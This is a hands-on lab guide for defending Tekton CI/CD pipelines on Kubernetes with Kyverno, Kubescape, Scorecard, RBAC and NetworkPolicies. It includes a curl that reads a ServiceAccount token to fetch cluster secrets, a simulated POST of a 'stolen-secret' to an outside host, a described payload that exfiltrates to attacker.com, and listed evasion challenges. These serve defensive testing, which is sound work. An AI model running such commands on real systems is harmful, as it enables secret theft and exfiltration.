# Supply Chain Security Tools Guide

This guide demonstrates how to use industry-standard security tools to **detect and prevent** supply chain attacks in CI/CD pipelines.

## 🎯 Learning Objectives

After completing this guide, you will understand how to:

1. **Deploy security scanning tools** (Kyverno, Kubescape) in Kubernetes
2. **Scan for vulnerabilities** using automated tools
3. **Implement prevention policies** to block attacks before they happen
4. **Monitor and audit** pipeline security using best practices

## 📚 Tools Overview

### Detection Tools

| Tool | Purpose | What It Detects |GitHub compliant | Gitea compliant |
|------|---------|-----------------|-----------------|-----------------|
| **Zizmor** | GitHub Actions scanner | `pull_request_target` misuse, script injection |✅|❌|
| **Scorecard** | OSSF project evaluator | Dangerous workflows, excessive permissions |✅|❌|
| **Kubescape** | K8s security scanner | RBAC misconfigurations, NSA/MITRE compliance |✅|✅|
| **Kyverno** | Policy engine (audit mode) | Dangerous ServiceAccounts, risky commands |✅|✅|
| **Audicia.io** | RBAC analyzer | Anomalous secret access, over-privileged SAs |✅|✅|

### Prevention Tools

| Tool | Purpose | What It Prevents |
|------|---------|------------------|
| **Kyverno** | Policy engine (enforce mode) | Non-compliant resource creation |
| **Network Policies** | Network segmentation | Data exfiltration to external servers |
| **RBAC** | Access control | Unauthorized secret access |
| **Harden-Runner** | GitHub Actions agent | Network egress from workflows |

---

## 🚀 Quick Start

### Complete Security Setup (5 minutes)

```bash
# 1. Setup deep dive environment
make setup

# 2. Deploy security tools
make setup-security-tools

# 3. Create and apply security policies
make create-security-policies
make apply-prevention-policies

# 4. Run security scan
make security-scan

# 5. Verify everything works
make verify-security
```

---

## Interactive Demos

This challenge includes three demo-magic scripts that walk through detection and prevention interactively. Each can be run standalone after the environment is set up (`make setup && make setup-ci-pr-pipeline`).

| Script | What It Demonstrates |
|--------|---------------------|
| `./scorecard-demo.sh` | OSSF Scorecard scanning for dangerous workflows (`pull_request_target`) on a GitHub repository |
| `./kubescape-demo.sh` | Before/after Kubescape scans (C-0015, C-0260), RBAC verification, NetworkPolicy application |
| `./kyverno-demo.sh` | Kyverno `block-dangerous-task-commands` (Audit mode with PolicyReports) and `restrict-tekton-pr-pipelines` (Enforce mode blocking unauthorized ServiceAccounts) |

> **Prerequisites**: `scorecard-demo.sh` requires the [sherine-k/gophers-api](https://github.com/sherine-k/gophers-api) GitHub repository cloned locally under `~/go/src/github.com/scraly/gophers-api`. Scorecard only works with GitHub repositories, not Gitea. `kubescape-demo.sh` requires `kubectl kubescape` plugin (`make install-kubescape`). `kyverno-demo.sh` requires Kyverno deployed (`make setup-kyverno`).

---

## 📖 Step-by-Step Walkthrough

### Phase 1: Understanding the Vulnerability

**1. Review the attack:**
```bash
cat ATTACK-ANALYSIS.md
cat challenges/challenge1/ATTACK-GUIDE.md
```

**2. Examine the vulnerable pipeline:**
```bash
cat challenges/challenge1/tekton/pipelines/vulnerable-pr-quality-pipeline.yaml
cat challenges/challenge1/tekton/tasks/vulnerable-quality-check-task.yaml
```

**Key vulnerability:**
```yaml
# Task runs untrusted code with privileged ServiceAccount
steps:
- name: run-quality-check
  script: |
    cd $(workspaces.source.path)
    go run ./scripts/quality-check/  # ⚠️ DANGEROUS!
```

**3. Test the exploit (before defenses):**
```bash
# Setup deep dive challenge
make setup-ci-pr-pipeline

# Review malicious payload
cat challenges/challenge1/malicious-payload-example.go

# The payload steals secrets via:
# 1. Read K8s ServiceAccount token
# 2. Call K8s API to get secrets
# 3. Exfiltrate via HTTP POST to attacker.com
```

---

### Phase 2: Deploying Security Tools

#### Deploy Kyverno (Policy Engine)

```bash
make setup-kyverno
```

**What this does:**
- Creates `kyverno` namespace
- Installs Kyverno via Helm
- Deploys admission controller webhook
- Enables policy enforcement

**Verify:**
```bash
kubectl get pods -n kyverno
kubectl get validatingwebhookconfigurations -l app.kubernetes.io/name=kyverno
```

#### Deploy Kubescape (Security Scanner)

```bash
make setup-kubescape
```

**What this does:**
- Creates `kubescape` namespace
- Installs Kubescape operator
- Enables continuous scanning
- Configures compliance frameworks (NSA, MITRE)

**Verify:**
```bash
kubectl get pods -n kubescape
```

> **Demo approach**: The `./kubescape-demo.sh` uses `make setup-ci-pr-pipeline-secure` to apply the secured pipeline configuration (RBAC + patched pipeline) in a single step, then applies NetworkPolicies directly with `kubectl apply -f security/network-policies/tekton-egress-restriction.yaml`. This achieves the same result as the phased approach above.

---

### Phase 3: Running Security Scans (Detection)

#### Scan with Kubescape

```bash
# Full framework scan on Tekton resources
kubectl kubescape scan framework nsa,mitre challenges/challenge1/tekton/ --format pretty-printer

# Scan entire cluster
kubectl kubescape scan --format pretty-printer --output cluster-scan.txt
```

**Targeted scans** (as demonstrated in `./kubescape-demo.sh`):

```bash
# Check for privileged containers (C-0015)
kubectl kubescape scan control C-0015 -v --include-namespaces ci

# Scan a specific workload pod
VULN_POD=$(kubectl get pods -n ci -l tekton.dev/pipelineTask=run-quality-checks -o name | head -1)
kubectl kubescape scan workload ${VULN_POD} --namespace ci

# Check for missing NetworkPolicies (C-0260) — after applying defenses
kubectl kubescape scan control C-0260 -v --include-namespaces ci
```

> For the full before/after comparison, run `./kubescape-demo.sh`. It scans the vulnerable pipeline (Phase 1), applies defenses via `make setup-ci-pr-pipeline-secure` + NetworkPolicies (Phase 2), then re-scans the secured pipeline (Phase 3).

**Controls checked in the demo:**

| Control | What It Checks | Demo Phase |
|---------|---------------|------------|
| C-0015 | Privileged containers | Phase 1 (before) |
| C-0260 | Missing NetworkPolicies | Phase 3 (after) |
| C-0034 | Automatic mounting of SA tokens | Phase 3 (Tekton limitation — cannot disable `automountServiceAccountToken` without breaking Tekton; mitigated by RBAC + NetworkPolicy) |

**Additional findings from full framework scans:**
```
❌ C-0017: Excessive RBAC permissions
   Resource: ServiceAccount/default (namespace: ci)
   Issue: Can access all secrets in namespace
   Severity: Critical
   Recommendation: Use least-privilege ServiceAccounts

❌ C-0074: Missing network policies
   Namespace: ci
   Issue: No egress restrictions
   Severity: High
   Recommendation: Apply NetworkPolicy to prevent data exfiltration
```

#### Scan with OSSF Scorecard (GitHub only)

> **GitHub only**: Scorecard requires a GitHub-hosted repository — it cannot scan Gitea repositories. The `./scorecard-demo.sh` demonstrates this using [sherine-k/gophers-api](https://github.com/sherine-k/gophers-api) with `--checks=Dangerous-Workflow`, comparing the `main` branch (safe) against a `test_pr_target` branch (uses `pull_request_target`).

```bash
# Install Scorecard
go install github.com/ossf/scorecard/v4/cmd/scorecard@latest

# Scan repository (all checks)
scorecard --repo=github.com/yourorg/yourrepo

# Focus on the check demonstrated in scorecard-demo.sh
scorecard --repo=github.com/sherine-k/gophers-api \
  --checks=Dangerous-Workflow --commit $(git rev-parse --short HEAD)

# Additional relevant checks
scorecard --repo=github.com/yourorg/yourrepo \
  --checks=Dangerous-Workflow,Token-Permissions,Pinned-Dependencies
```

**Example output:**
```
Check: Dangerous-Workflow
Score: 0/10
Reason: Detected 'pull_request_target' with code checkout
Details:
  ❌ .github/workflows/pr-check.yml:5
     Uses 'pull_request_target' with 'actions/checkout' on untrusted ref
     This allows attackers to execute code with workflow permissions
```

---

### Phase 4: Applying Prevention Policies

#### Create Security Policies

```bash
make create-security-policies
```

**What this creates:**

1. **Kyverno Policies** (`challenges/challenge1/security/kyverno-policies/`)
   - Block dangerous ServiceAccounts
   - Warn on risky commands (`go run`, `curl|bash`)
   - Restrict external Git repositories

   **Policies demonstrated in `./kyverno-demo.sh`:**
   - `security/kyverno-policies/block-dangerous-commands.yaml` — **Audit mode**: detects dangerous commands in Tasks; violations appear in PolicyReports
   - `security/kyverno-policies/restrict-tekton-serviceaccounts.yaml` — **Enforce mode**: blocks PipelineRun/TaskRun creation with unauthorized ServiceAccounts (only `pr-pipeline-readonly` is allowed)

2. **Network Policies** (`security/network-policies/`)
   - Block egress to external IPs
   - Allow only: DNS, K8s API, internal Gitea

3. **RBAC Configs** (`challenges/challenge1/security/rbac/`)
   - `pr-pipeline-readonly`: NO secret access
   - `main-pipeline`: Limited secret access
   - `security-auditor`: Monitoring access

#### Apply Prevention Policies (only if updating the above created resources)

```bash
make apply-prevention-policies

# Or apply NetworkPolicy directly (as done in kubescape-demo.sh):
kubectl apply -f security/network-policies/tekton-egress-restriction.yaml
```

**Verify policies are active:**
```bash
# Check Kyverno policies
kubectl get clusterpolicy

# Check Network Policies
kubectl get networkpolicy --all-namespaces

# Check ServiceAccounts
kubectl get sa -n ci
kubectl describe role pr-pipeline-minimal -n ci
```

---

### Phase 5: Testing the Defenses

#### Test 1: Kyverno Blocks Dangerous ServiceAccount

Open a new Pull Request, or close and reopen the existing one. No Pipeline should get triggered. 

**Other possibility** 
```bash
# Try to create PipelineRun with default ServiceAccount
cat <<EOF | kubectl apply -f -
apiVersion: tekton.dev/v1
kind: PipelineRun
metadata:
  name: test-blocked-sa
  namespace: ci
spec:
  pipelineRef:
    name: pr-quality-check-pipeline
  serviceAccountName: default  # ❌ Should be BLOCKED
  params:
  - name: pr-repo-url
    value: http://gitea.gitea.svc.cluster.local/sc-admin/test-repo.git
  - name: pr-sha
    value: main
  - name: pr-number
    value: "1"
  workspaces:
  - name: source
    emptyDir: {}
EOF
```

**Expected result:**
```
Error from server: admission webhook "validate.kyverno.svc" denied the request:
  policy PipelineRun/ci/test-blocked-sa for resource violation:
  restrict-tekton-pr-pipelines:
    require-readonly-serviceaccount-for-prs: validation error: PR pipelines must
    use 'pr-pipeline-readonly' ServiceAccount. Using the default or privileged
    ServiceAccount allows untrusted code to access cluster secrets.
```

**Fix and retry:**
```bash
make setup-ci-pr-pipeline-secure
```
Close or re-open the pull request. 
Then, verify if the pipelinerun was triggered, and that the init code was unsuccessful in reading the registry-credentials secret
```bash
$ tkn pr list
NAME                     STARTED          DURATION   STATUS
pr-quality-check-qzltm   4 seconds ago    ---        Running
pr-quality-check-s72gp   33 minutes ago   35s        Succeeded
pr-quality-check-86plr   37 minutes ago   39s        Succeeded
pr-quality-check-4jwqd   4 hours ago      1m4s       Succeeded
$ tkn pr logs -f pr-quality-check-qzltm
# ... Skipping
[run-quality-checks : run-quality-script] Secret retrieved : {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"secrets \"registry-credentials\" is forbidden: User \"system:serviceaccount:ci:pr-pipeline-readonly\" cannot get resource \"secrets\" in API group \"\" in the namespace \"ci\"","reason":"Forbidden","details":{"name":"registry-credentials","kind":"secrets"},"code":403}
# ... Skipping
``` 

#### Test 2: RBAC Blocks Secret Access

```bash
# Create a test pod with pr-pipeline-readonly ServiceAccount
kubectl run -n ci rbac-test \
  --image=curlimages/curl:latest \
  --serviceaccount=pr-pipeline-readonly \
  --rm -it --restart=Never -- sh

# Inside the pod, try to steal secrets (like the malicious payload does):
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  https://kubernetes.default.svc/api/v1/namespaces/ci/secrets/registry-credentials
```

**Expected result:**
```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "secrets \"registry-credentials\" is forbidden: User \"system:serviceaccount:ci:pr-pipeline-readonly\" cannot get resource \"secrets\" in API group \"\" in the namespace \"ci\"",
  "reason": "Forbidden",
  "code": 403
}
```

**✅ Defense successful!** Even if malicious code runs, it cannot access secrets.

#### (NOT YET TESTED) Test 3: Network Policy Blocks Exfiltration

```bash
# Create a test pod in ci namespace
kubectl run -n ci netpol-test \
  --image=curlimages/curl:latest \
  --rm -it --restart=Never -- sh

# Try to exfiltrate data to external server (simulating attacker.com):
curl -m 10 -X POST \
  -d "stolen-secret=FLAG{example}" \
  http://httpbin.org/post
```

**Expected result:**
```
curl: (28) Connection timed out after 10000 milliseconds
```

**Test internal connectivity still works:**
```bash
# DNS should work
nslookup gitea.gitea.svc.cluster.local

# Internal Gitea should be accessible
curl -m 5 http://gitea.gitea.svc.cluster.local:3000
```

**✅ Defense successful!** Malicious code cannot exfiltrate data externally.

---

### Phase 6: Continuous Monitoring

#### Kyverno Policy Reports

> Demonstrated in `./kyverno-demo.sh` (step 3): applies `block-dangerous-task-commands` in Audit mode, then queries PolicyReports for failed validations.

```bash
# View policy violations
kubectl get policyreport -A

# Detailed report for ci namespace
kubectl describe policyreport -n ci

# Query PolicyReports for specific failures (as in kyverno-demo.sh)
kubectl get policyreport -n ci -o json | \
  jq '.items[] | select(.summary.fail > 0) | {task: .scope.name, kind: .scope.kind, failures: [.results[] | select(.result == "fail") | {rule, message}]}'
```

#### (NOT YET TESTED) Monitor with Kubescape

```bash
# Continuous scanning (if enabled)
kubectl get workloadconfigurationscans -n kubescape

# View scan results
kubectl describe workloadconfigurationscans -n kubescape
```

#### (NOT YET TESTED) Audit Logs Analysis (with Audicia.io or manual)

If using Audicia.io:
```bash
# Connect to audit log stream
audicia connect --cluster-name ci-cluster

# Detect anomalous secret access
audicia analyze --anomalies --resource-type secrets

# Generate minimal RBAC based on actual usage
audicia generate-rbac --namespace ci --output optimized-rbac.yaml
```

Manual audit log analysis:
```bash
# Enable audit logging in KinD (requires cluster recreation)
# Then analyze logs for suspicious patterns:

# ServiceAccounts accessing secrets
kubectl logs -n kube-apiserver kube-apiserver-* | \
  grep "secrets" | grep "get\|list" | jq .

# Failed authorization attempts
kubectl logs -n kube-apiserver kube-apiserver-* | \
  grep "Forbidden" | jq .
```

---

## 🔧 Customizing Security Policies

### Make Kyverno More Strict

Change from `audit` (warn) to `enforce` (block):

```bash
kubectl edit clusterpolicy restrict-external-git-repositories

# Change line:
# validationFailureAction: audit
# To:
# validationFailureAction: enforce
```

### Allow Specific External Repositories

```yaml
# Edit challenges/challenge1/security/kyverno-policies/restrict-external-git-repos.yaml
# Add exception rule:
rules:
- name: allow-trusted-repo
  match:
    any:
    - resources:
        kinds:
        - PipelineRun
  validate:
    message: "Allowed: Trusted external repository"
    pattern:
      spec:
        params:
        - name: git-url
          value: "https://github.com/trusted-org/specific-repo.git"
```

### Add More Network Policy Exceptions

```yaml
# Edit security/network-policies/tekton-egress-restriction.yaml
# Add under egress section:
- to:
  - namespaceSelector:
      matchLabels:
        name: my-service
  ports:
  - port: 8080
    protocol: TCP
```

---

## 📊 Security Scorecard

After implementing all defenses, your security posture:

| Control | Before | After | Improvement |
|---------|--------|-------|-------------|
| ServiceAccount Permissions | All pods can access all secrets | Only named SAs can access specific secrets | ✅ 95% reduction |
| Network Egress | Unrestricted | Blocked except DNS, K8s API, Gitea | ✅ 99% blocked |
| Policy Enforcement | None | Kyverno blocks dangerous configs | ✅ Proactive prevention |
| Monitoring | None | Continuous scanning, audit logs | ✅ Real-time detection |
| Compliance | Unknown | NSA, MITRE frameworks | ✅ Auditable |

---

## 🎓 Best Practices Checklist

- [ ] **Separate ServiceAccounts** for different trust levels (PR vs main)
- [ ] **Network Policies** applied to all pipeline namespaces
- [ ] **Kyverno policies** in enforce mode (after testing)
- [ ] **Regular security scans** automated in CI/CD
- [ ] **Audit log monitoring** for anomalous access
- [ ] **Least privilege RBAC** - only named secrets accessible
- [ ] **Pin action versions** to commit SHAs (GitHub Actions)
- [ ] **Code review** for workflow changes
- [ ] **Dependency scanning** (Dependabot, Renovate)
- [ ] **Supply chain attestation** (Sigstore, SLSA)

---

## 🔗 Tool Documentation

### Official Documentation

- **Kyverno**: https://kyverno.io/docs/
- **Kubescape**: https://kubescape.io/docs/
- **OSSF Scorecard**: https://github.com/ossf/scorecard
- **Zizmor**: https://github.com/woodruffw/zizmor
- **Harden-Runner**: https://github.com/step-security/harden-runner
- **Audicia.io**: https://audicia.io/docs
- **GUAC**: https://guac.sh/

### Related Standards

- **SLSA Framework**: https://slsa.dev/
- **Supply-chain Levels for Software Artifacts**: Levels 1-4
- **SSDF (NIST)**: Secure Software Development Framework
- **NSA Kubernetes Hardening**: https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/

---

## 💡 Advanced Challenges

Once you've mastered the basics, try these:

1. **Bypass Network Policy**: Can you exfiltrate data via DNS tunneling?
2. **TOCTOU Attack**: Time-of-check vs time-of-use race conditions
3. **Policy Evasion**: Find gaps in Kyverno policy patterns
4. **Privilege Escalation**: Chain multiple small permissions
5. **Supply Chain Persistence**: Deploy backdoors that survive restarts

See [`challenges/ADVANCED-CHALLENGES.md`](challenges/ADVANCED-CHALLENGES.md) for details.

---

## 🆘 Troubleshooting

### Kyverno Policies Not Enforcing

```bash
# Check webhook is running
kubectl get validatingwebhookconfigurations

# Check Kyverno pods
kubectl get pods -n kyverno

# View policy status
kubectl describe clusterpolicy restrict-tekton-pr-pipelines
```

### Network Policy Not Blocking Traffic

```bash
# Verify namespace labels
kubectl get namespace ci -o yaml | grep labels -A 5

# Check policy is applied
kubectl get networkpolicy -n ci

# Verify CNI supports network policies
kubectl get nodes -o wide
# (KinD uses kindnetd which supports NetworkPolicy)
```

### RBAC Permissions Issues

```bash
# Check ServiceAccount exists
kubectl get sa pr-pipeline-readonly -n ci

# Verify Role and RoleBinding
kubectl describe role pr-pipeline-minimal -n ci
kubectl describe rolebinding pr-pipeline-readonly-binding -n ci

# Test permissions
kubectl auth can-i get secrets \
  --as=system:serviceaccount:ci:pr-pipeline-readonly \
  -n ci
# Should return: no
```

---

## 📝 Summary

You've learned how to:

✅ Deploy enterprise-grade security tools (Kyverno, Kubescape)
✅ Scan for vulnerabilities using automated scanners
✅ Implement defense-in-depth with policies, RBAC, and network controls
✅ Test defenses against real attack scenarios
✅ Monitor and audit pipeline security continuously

**Key Takeaway**: Supply chain security requires **multiple layers** of defense. No single tool is sufficient - combine prevention, detection, and monitoring for robust security.

For the complete attack analysis, see [`ATTACK-ANALYSIS.md`](ATTACK-ANALYSIS.md).
